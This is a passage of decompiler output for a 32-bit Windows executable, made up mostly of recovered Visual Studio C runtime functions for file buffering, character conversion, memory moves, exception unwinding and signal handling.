      if (((_MaxCount < sVar2) && ((*ppuVar3)[_MaxCount] == '=')) &&
         (iVar1 = __mbsnbicoll(*ppuVar3,(uchar *)param_1,_MaxCount), iVar1 == 0)) {
        return (char *)(*ppuVar3 + _MaxCount + 1);
      }
    }
  }
  return (char *)0x0;
}



// Library Function - Single Match
//  ____lc_codepage_func
// 
// Library: Visual Studio 2008 Release

UINT __cdecl ____lc_codepage_func(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  ptVar2 = p_Var1->ptlocinfo;
  if ((ptVar2 != (pthreadlocinfo)PTR_DAT_00418ac8) && ((p_Var1->_ownlocale & DAT_004189e4) == 0)) {
    ptVar2 = ___updatetlocinfo();
  }
  return ptVar2->lc_codepage;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00418b10;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b2e0)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __ungetc_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __ungetc_nolock(int _Ch,FILE *_File)

{
  char *pcVar1;
  uint uVar2;
  int *piVar3;
  undefined *puVar4;
  
  if ((*(byte *)&_File->_flag & 0x40) != 0) {
LAB_0040ec29:
    if (_Ch != -1) {
      uVar2 = _File->_flag;
      if (((uVar2 & 1) != 0) || (((char)uVar2 < '\0' && ((uVar2 & 2) == 0)))) {
        if (_File->_base == (char *)0x0) {
          __getbuf(_File);
        }
        if (_File->_ptr == _File->_base) {
          if (_File->_cnt != 0) {
            return -1;
          }
          _File->_ptr = _File->_ptr + 1;
        }
        _File->_ptr = _File->_ptr + -1;
        pcVar1 = _File->_ptr;
        if ((*(byte *)&_File->_flag & 0x40) == 0) {
          *pcVar1 = (char)_Ch;
        }
        else if (*pcVar1 != (char)_Ch) {
          _File->_ptr = pcVar1 + 1;
          return -1;
        }
        _File->_cnt = _File->_cnt + 1;
        _File->_flag = _File->_flag & 0xffffffefU | 1;
        return _Ch & 0xff;
      }
    }
    return -1;
  }
  uVar2 = __fileno(_File);
  if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
    puVar4 = &DAT_00418b10;
  }
  else {
    puVar4 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)uVar2 >> 5]);
  }
  if ((puVar4[0x24] & 0x7f) == 0) {
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar4 = &DAT_00418b10;
    }
    else {
      puVar4 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)uVar2 >> 5]);
    }
    if ((puVar4[0x24] & 0x80) == 0) goto LAB_0040ec29;
  }
  piVar3 = __errno();
  *piVar3 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_0040ece0;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_0040ece0:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2008 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040edc2(undefined4 param_1)

{
  _DAT_00419b70 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl ___crtInitCritSecAndSpinCount(LPCRITICAL_SECTION param_1,DWORD param_2)

{
  BOOL BVar1;
  
  BVar1 = InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return BVar1;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040f023_caseD_2;
        case 3:
          goto switchD_0040f023_caseD_3;
        }
        goto switchD_0040f023_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040f023_caseD_0;
      case 1:
        goto switchD_0040f023_caseD_1;
      case 2:
        goto switchD_0040f023_caseD_2;
      case 3:
        goto switchD_0040f023_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040f023_caseD_2;
            case 3:
              goto switchD_0040f023_caseD_3;
            }
            goto switchD_0040f023_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040f023_caseD_2;
            case 3:
              goto switchD_0040f023_caseD_3;
            }
            goto switchD_0040f023_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040f023_caseD_2;
            case 3:
              goto switchD_0040f023_caseD_3;
            }
            goto switchD_0040f023_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040f023_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040f023_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040f023_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040f023_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_0041a2b0 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040ee9c_caseD_2;
      case 3:
        goto switchD_0040ee9c_caseD_3;
      }
      goto switchD_0040ee9c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040ee9c_caseD_0;
    case 1:
      goto switchD_0040ee9c_caseD_1;
    case 2:
      goto switchD_0040ee9c_caseD_2;
    case 3:
      goto switchD_0040ee9c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040ee9c_caseD_2;
          case 3:
            goto switchD_0040ee9c_caseD_3;
          }
          goto switchD_0040ee9c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040ee9c_caseD_2;
          case 3:
            goto switchD_0040ee9c_caseD_3;
          }
          goto switchD_0040ee9c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040ee9c_caseD_2;
          case 3:
            goto switchD_0040ee9c_caseD_3;
          }
          goto switchD_0040ee9c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040ee9c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040ee9c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040ee9c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040ee9c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040f238;
  pvStack_28 = ExceptionList;
  local_20 = DAT_00418df8 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_004117f0();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_0040f27e(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x0040f2c8. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40f2df,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2008 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_00418df8 ^ 0x416c00;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



void FUN_0040f486(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_00419b74);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2008 Release

void __initp_eh_hooks(void)

{
  DAT_00419b74 = __encode_pointer(0x40f44d);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2008 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_00419b78 = param_1;
  DAT_00419b7c = param_1;
  DAT_00419b80 = param_1;
  DAT_00419b84 = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2008 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00418b0c * 0xc + param_3);
  if ((DAT_00418b0c * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2008 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_00419b80);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2008 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_00419b78;
        iVar4 = DAT_00419b78;
        goto LAB_0040f5f9;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_0040f5d7;
        if (_SigNum != 8) goto LAB_0040f5bb;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_00419b84;
      iVar4 = DAT_00419b84;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_00419b7c;
      iVar4 = DAT_00419b7c;
    }
    else {
      if (_SigNum != 0x16) {
LAB_0040f5bb:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_0040f5d7:
      ppcVar6 = (code **)&DAT_00419b80;
      iVar4 = DAT_00419b80;
    }
LAB_0040f5f9:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_0040f65d;
    }
  }
  else {
LAB_0040f65d:
    if (_SigNum == 8) {
      for (local_28 = DAT_00418b00; local_28 < DAT_00418b04 + DAT_00418b00; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_0040f697;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_0040f697:
  FUN_0040f6b8();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_0040f6b8(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040a124(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040f6f4(undefined4 param_1)

{
  _DAT_00419b8c = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040f703(undefined4 param_1)

{
  _DAT_00419b98 = param_1;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = __encoded_null();
  local_8 = 0;
